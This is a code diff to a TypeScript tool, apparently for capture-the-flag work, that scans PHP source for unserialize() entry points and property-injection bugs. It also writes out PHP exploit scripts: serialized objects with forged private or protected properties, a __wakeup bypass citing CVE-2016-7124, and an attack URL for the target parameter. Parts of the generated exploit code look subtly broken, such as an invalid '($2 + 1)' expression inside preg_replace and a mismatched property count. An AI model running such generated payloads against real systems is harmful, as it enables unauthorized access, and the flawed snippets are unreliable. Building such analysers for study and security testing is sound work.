@@ -77,6 +77,23 @@ export interface POPGadget {
     codePattern: string;  // 代码模式描述
 }
 
+// 属性条件 - 用于检测 if($this->prop === value) 这种模式
+export interface PropertyCondition {
+    propertyName: string;
+    operator: '===' | '==' | '!=' | '!==' | '>' | '<' | '>=' | '<=';
+    targetValue: any;
+    line: number;
+    action: string;  // 满足条件时的操作描述
+    isSensitive: boolean;  // 是否是敏感操作（如输出flag、执行命令等）
+}
+
+// __wakeup 重置信息
+export interface WakeupReset {
+    propertyName: string;
+    resetValue: any;
+    line: number;
+}
+
 export interface ChainStep {
     className: string;
     methodName: string;
@@ -116,6 +133,9 @@ export interface POPChainResult {
     payloadObject?: PayloadObject;  // 结构化的payload对象
     paramName?: string;      // unserialize 的参数名 (如 'data')
     paramSource?: string;    // 参数来源 (如 '$_GET')
+    vulnType?: 'pop_chain' | 'property_injection' | 'wakeup_bypass';  // 漏洞类型
+    bypassWakeup?: boolean;  // 是否需要绕过 __wakeup
+    useBase64?: boolean;     // 是否需要 base64 编码
 }
 
 export interface EntryPoint {
@@ -200,7 +220,7 @@ export class POPChainDetector {
         return props;
     }
     // 存储检测到的 unserialize 参数信息
-    private unserializeParam: { paramName?: string; paramSource?: string } = {};
+    private unserializeParam: { paramName?: string; paramSource?: string; useBase64?: boolean } = {};
 
     /**
      * 主入口 - 检测POP链
@@ -235,11 +255,15 @@ export class POPChainDetector {
         const gadgets = this.findAllGadgets();
         console.log(`找到 ${gadgets.length} 个Gadget`);
 
-        // 3. 构建完整的攻击链
+        // 3. 构建完整的攻击链（POP链）
         const chains = this.buildCompleteChains(gadgets);
         console.log(`构建了 ${chains.length} 条POP链`);
 
-        return chains;
+        // 4. 检测属性注入漏洞（不需要POP链，直接修改属性即可利用）
+        const propertyInjections = this.findPropertyInjectionVulns(gadgets);
+        console.log(`检测到 ${propertyInjections.length} 个属性注入漏洞`);
+
+        return [...chains, ...propertyInjections];
     }
 
     /**
@@ -256,7 +280,7 @@ export class POPChainDetector {
         if (node.kind === 'call' && node.what) {
             const funcName = node.what.name || '';
             if (funcName === 'unserialize' && node.arguments && node.arguments.length > 0) {
-                const extracted = this.extractParamSource(node.arguments[0]);
+                const extracted = this.extractParamSourceWithBase64(node.arguments[0]);
                 if (extracted.paramName) {
                     this.unserializeParam = extracted;
                     console.log('检测到 unserialize 参数:', extracted);
@@ -277,6 +301,28 @@ export class POPChainDetector {
                 }
             }
         }
+    }
+
+    /**
+     * 从 AST 节点提取参数来源信息（支持 base64 检测）
+     */
+    private extractParamSourceWithBase64(node: any): { paramName?: string; paramSource?: string; useBase64?: boolean } {
+        if (!node) return {};
+        
+        // base64_decode($_GET['data']) 等包装函数
+        if (node.kind === 'call' && node.what) {
+            const funcName = node.what.name || '';
+            if (funcName === 'base64_decode' && node.arguments && node.arguments.length > 0) {
+                const inner = this.extractParamSource(node.arguments[0]);
+                return { ...inner, useBase64: true };
+            }
+            // 其他包装函数
+            if (node.arguments && node.arguments.length > 0) {
+                return this.extractParamSourceWithBase64(node.arguments[0]);
+            }
+        }
+        
+        return this.extractParamSource(node);
     }
 
     /**
@@ -1133,6 +1179,386 @@ export class POPChainDetector {
         if (critical.includes(funcName.toLowerCase())) return 'critical';
         if (high.includes(funcName.toLowerCase())) return 'high';
         return 'medium';
+    }
+
+    /**
+     * 检测属性注入漏洞
+     * 这种漏洞不需要 POP 链，直接修改对象属性就能触发敏感操作
+     * 例如: if($this->isAdmin === true) { echo $flag; }
+     */
+    private findPropertyInjectionVulns(gadgets: POPGadget[]): POPChainResult[] {
+        const results: POPChainResult[] = [];
+
+        // 遍历所有魔术方法
+        const entryGadgets = gadgets.filter(g => 
+            g.isMagic && ['__wakeup', '__destruct', '__toString'].includes(g.methodName)
+        );
+
+        for (const gadget of entryGadgets) {
+            const classInfo = this.classMap.get(gadget.className);
+            if (!classInfo) continue;
+
+            const methodNode = classInfo.methods.find(m => m.name === gadget.methodName)?.node;
+            if (!methodNode) continue;
+
+            // 分析方法中的条件判断
+            const conditions = this.analyzeConditions(methodNode, gadget.className);
+            
+            // 检测 __wakeup 是否会重置这些属性
+            const wakeupGadget = gadgets.find(g => 
+                g.className === gadget.className && g.methodName === '__wakeup'
+            );
+            const wakeupResets = wakeupGadget ? this.analyzeWakeupResets(
+                classInfo.methods.find(m => m.name === '__wakeup')?.node,
+                gadget.className
+            ) : [];
+
+            for (const cond of conditions) {
+                if (!cond.isSensitive) continue;
+
+                // 检查这个属性是否被 __wakeup 重置
+                const isResetByWakeup = wakeupResets.some(r => r.propertyName === cond.propertyName);
+                const needsBypassWakeup = isResetByWakeup && gadget.methodName !== '__wakeup';
+
+                // 获取属性信息
+                const allProps = this.getAllClassProperties(gadget.className);
+                const propInfo = allProps.find(p => p.name === cond.propertyName);
+
+                // 生成 payload
+                const payload = this.generatePropertyInjectionPayload(
+                    gadget.className,
+                    cond,
+                    propInfo?.visibility || 'public',
+                    needsBypassWakeup,
+                    allProps
+                );
+
+                const result: POPChainResult = {
+                    entryClass: gadget.className,
+                    entryMethod: gadget.methodName,
+                    steps: [{
+                        className: gadget.className,
+                        methodName: gadget.methodName,
+                        trigger: gadget.methodName === '__wakeup' ? '反序列化时触发' : 
+                                 gadget.methodName === '__destruct' ? '对象销毁时触发' : '其他触发',
+                        description: `检测到条件: $this->${cond.propertyName} ${cond.operator} ${JSON.stringify(cond.targetValue)}`,
+                        line: cond.line,
+                        reads: [`$this->${cond.propertyName}`],
+                        writes: [],
+                        calls: [],
+                        operations: [cond.action]
+                    }],
+                    finalSink: cond.action,
+                    riskLevel: 'high',
+                    payload,
+                    description: `属性注入: 设置 ${gadget.className}::$${cond.propertyName} = ${JSON.stringify(cond.targetValue)} 触发 ${cond.action}`,
+                    exploitMethod: cond.action,
+                    dataFlow: `unserialize() -> ${gadget.className}::${gadget.methodName}() -> if($this->${cond.propertyName}) -> ${cond.action}`,
+                    paramName: this.unserializeParam.paramName,
+                    paramSource: this.unserializeParam.paramSource,
+                    vulnType: 'property_injection',
+                    bypassWakeup: needsBypassWakeup
+                };
+
+                results.push(result);
+            }
+        }
+
+        return results;
+    }
+
+    /**
+     * 分析方法中的条件判断
+     */
+    private analyzeConditions(methodNode: any, className: string): PropertyCondition[] {
+        const conditions: PropertyCondition[] = [];
+        
+        this.traverseNode(methodNode, (node: any) => {
+            if (node.kind === 'if') {
+                const cond = this.extractCondition(node.test, className, node);
+                if (cond) {
+                    conditions.push(cond);
+                }
+            }
+        });
+
+        return conditions;
+    }
+
+    /**
+     * 提取条件表达式信息
+     */
+    private extractCondition(testNode: any, className: string, ifNode: any): PropertyCondition | null {
+        if (!testNode) return null;
+
+        // 处理 $this->prop === value 模式
+        if (testNode.kind === 'bin') {
+            const left = testNode.left;
+            const right = testNode.right;
+            const op = testNode.type;
+
+            let propName: string | null = null;
+            let targetValue: any = null;
+
+            // 检查左边是否是 $this->prop
+            if (this.isThisProperty(left)) {
+                propName = this.getPropertyFromNode(left);
+                targetValue = this.extractLiteralValue(right);
+            } else if (this.isThisProperty(right)) {
+                propName = this.getPropertyFromNode(right);
+                targetValue = this.extractLiteralValue(left);
+            }
+
+            if (propName && targetValue !== undefined) {
+                // 分析 if 块中的操作，判断是否是敏感操作
+                const action = this.analyzeIfBlockAction(ifNode.body);
+                const isSensitive = this.isSensitiveAction(action);
+
+                return {
+                    propertyName: propName,
+                    operator: op as any,
+                    targetValue,
+                    line: testNode.loc?.start?.line || 1,
+                    action,
+                    isSensitive
+                };
+            }
+        }
+
+        return null;
+    }
+
+    /**
+     * 分析 if 块中的操作
+     */
+    private analyzeIfBlockAction(body: any): string {
+        if (!body) return '未知操作';
+
+        const actions: string[] = [];
+        
+        this.traverseNode(body, (node: any) => {
+            if (node.kind === 'echo' || node.kind === 'print') {
+                // 检查是否输出敏感信息
+                const text = this.extractEchoContent(node);
+                if (text.toLowerCase().includes('flag') || text.toLowerCase().includes('admin') || 
+                    text.toLowerCase().includes('secret') || text.toLowerCase().includes('welcome')) {
+                    actions.push(`输出敏感信息: ${text.substring(0, 50)}`);
+                }
+            } else if (node.kind === 'call') {
+                const funcName = node.what?.name || '';
+                if (['system', 'exec', 'shell_exec', 'passthru', 'eval', 'file_get_contents', 'include', 'require'].includes(funcName)) {
+                    actions.push(`调用危险函数: ${funcName}()`);
+                }
+            }
+        });
+
+        return actions.length > 0 ? actions.join('; ') : '执行代码块';
+    }
+
+    /**
+     * 提取 echo 内容
+     */
+    private extractEchoContent(node: any): string {
+        if (!node.expressions && !node.arguments) return '';
+        
+        const exprs = node.expressions || node.arguments || [];
+        const parts: string[] = [];
+        
+        for (const expr of (Array.isArray(exprs) ? exprs : [exprs])) {
+            if (expr.kind === 'string') {
+                parts.push(expr.value || '');
+            } else if (expr.kind === 'encapsed') {
+                for (const part of (expr.value || [])) {
+                    if (part.kind === 'string') {
+                        parts.push(part.value || '');
+                    }
+                }
+            }
+        }
+        
+        return parts.join('');
+    }
+
+    /**
+     * 判断是否是敏感操作
+     */
+    private isSensitiveAction(action: string): boolean {
+        const sensitiveKeywords = ['flag', 'admin', 'secret', 'password', 'key', 'token', 
+                                   'system', 'exec', 'shell', 'eval', 'include', 'require'];
+        return sensitiveKeywords.some(kw => action.toLowerCase().includes(kw));
+    }
+
+    /**
+     * 分析 __wakeup 中的属性重置
+     */
+    private analyzeWakeupResets(methodNode: any, className: string): WakeupReset[] {
+        const resets: WakeupReset[] = [];
+        if (!methodNode) return resets;
+
+        this.traverseNode(methodNode, (node: any) => {
+            // 检测 $this->prop = value 赋值
+            if (node.kind === 'assign' || node.kind === 'expressionstatement') {
+                const assignNode = node.kind === 'assign' ? node : node.expression;
+                if (assignNode?.kind === 'assign') {
+                    const left = assignNode.left;
+                    if (this.isThisProperty(left)) {
+                        const propName = this.getPropertyFromNode(left);
+                        const resetValue = this.extractLiteralValue(assignNode.right);
+                        if (propName) {
+                            resets.push({
+                                propertyName: propName,
+                                resetValue,
+                                line: node.loc?.start?.line || 1
+                            });
+                        }
+                    }
+                }
+            }
+        });
+
+        return resets;
+    }
+
+    /**
+     * 提取字面量值
+     */
+    private extractLiteralValue(node: any): any {
+        if (!node) return undefined;
+        
+        switch (node.kind) {
+            case 'boolean': return node.value;
+            case 'number': return node.value;
+            case 'string': return node.value;
+            case 'nullkeyword': return null;
+            case 'array': return [];
+            default: return undefined;
+        }
+    }
+
+    /**
+     * 生成属性注入 payload
+     */
+    private generatePropertyInjectionPayload(
+        className: string,
+        condition: PropertyCondition,
+        visibility: string,
+        needsBypassWakeup: boolean,
+        allProps: PropertyInfo[]
+    ): string {
+        let code = `<?php\n/**\n * 属性注入漏洞利用\n * 目标: ${className}::$${condition.propertyName} = ${JSON.stringify(condition.targetValue)}\n`;
+        if (needsBypassWakeup) {
+            code += ` * 注意: 需要绕过 __wakeup (CVE-2016-7124)\n`;
+        }
+        code += ` */\n\n`;
+
+        // 生成类定义
+        const classInfo = this.classMap.get(className);
+        code += `class ${className} {\n`;
+        for (const prop of allProps) {
+            code += `    ${prop.visibility} $${prop.name};\n`;
+        }
+        code += `}\n\n`;
+
+        // 生成 exploit 对象
+        code += `$exploit = new ${className}();\n`;
+        
+        // 设置目标属性
+        const targetValue = this.phpValueToString(condition.targetValue);
+        if (visibility === 'public') {
+            code += `$exploit->${condition.propertyName} = ${targetValue};  // 关键属性\n`;
+        } else {
+            code += `// ${condition.propertyName} 是 ${visibility} 属性，需要使用反射或手动构造序列化字符串\n`;
+            code += `// 序列化格式: `;
+            if (visibility === 'private') {
+                code += `\\x00${className}\\x00${condition.propertyName}\n`;
+            } else {
+                code += `\\x00*\\x00${condition.propertyName}\n`;
+            }
+        }
+
+        code += `\n$payload = serialize($exploit);\n\n`;
+
+        // 如果是 private/protected，需要手动构造
+        if (visibility !== 'public') {
+            code += `// === 手动构造 ${visibility} 属性的序列化字符串 ===\n`;
+            const propCount = allProps.length;
+            if (visibility === 'private') {
+                code += `$payload = 'O:${className.length}:"${className}":${propCount}:{`;
+                code += `s:${className.length + condition.propertyName.length + 2}:"\\x00${className}\\x00${condition.propertyName}";`;
+            } else {
+                code += `$payload = 'O:${className.length}:"${className}":${propCount}:{`;
+                code += `s:${condition.propertyName.length + 3}:"\\x00*\\x00${condition.propertyName}";`;
+            }
+            code += `${this.serializeValue(condition.targetValue)}`;
+            code += `}';\n\n`;
+        }
+
+        // 绕过 __wakeup
+        if (needsBypassWakeup) {
+            code += `// === 绕过 __wakeup (修改属性数量) ===\n`;
+            code += `// 将 ${className}:X: 改为 ${className}:(X+1):\n`;
+            code += `$payload = preg_replace('/O:(\\d+):"${className}":(\\d+):/', 'O:$1:"${className}":' . ($2 + 1) . ':', $payload);\n`;
+            code += `// 或者手动: 将属性数量加1\n\n`;
+        }
+
+        // 输出
+        code += `echo "Payload (raw):\\n" . $payload . "\\n\\n";\n`;
+        code += `echo "Payload (URL):\\n" . urlencode($payload) . "\\n\\n";\n`;
+
+        // 生成 URL
+        if (this.unserializeParam.paramName && this.unserializeParam.paramSource === '$_GET') {
+            code += `echo "利用URL:\\nhttp://target/?${this.unserializeParam.paramName}=" . urlencode($payload) . "\\n";\n`;
+        }
+
+        return code;
+    }
+
+    /**
+     * PHP 值转字符串
+     */
+    private phpValueToString(value: any): string {
+        if (value === true) return 'true';
+        if (value === false) return 'false';
+        if (value === null) return 'null';
+        if (typeof value === 'string') return `"${value}"`;
+        if (typeof value === 'number') return String(value);
+        return 'null';
+    }
+
+    /**
+     * 序列化值
+     */
+    private serializeValue(value: any): string {
+        if (value === true) return 'b:1;';
+        if (value === false) return 'b:0;';
+        if (value === null) return 'N;';
+        if (typeof value === 'string') return `s:${value.length}:"${value}";`;
+        if (typeof value === 'number') {
+            if (Number.isInteger(value)) return `i:${value};`;
+            return `d:${value};`;
+        }
+        return 'N;';
+    }
+
+    /**
+     * 通用节点遍历
+     */
+    private traverseNode(node: any, callback: (node: any) => void): void {
+        if (!node) return;
+        
+        callback(node);
+        
+        if (Array.isArray(node)) {
+            node.forEach(child => this.traverseNode(child, callback));
+        } else if (typeof node === 'object') {
+            for (const key of Object.keys(node)) {
+                if (key === 'loc' || key === 'leadingComments' || key === 'trailingComments') continue;
+                const child = node[key];
+                if (child && typeof child === 'object') {
+                    this.traverseNode(child, callback);
+                }
+            }
+        }
     }
 
     /**
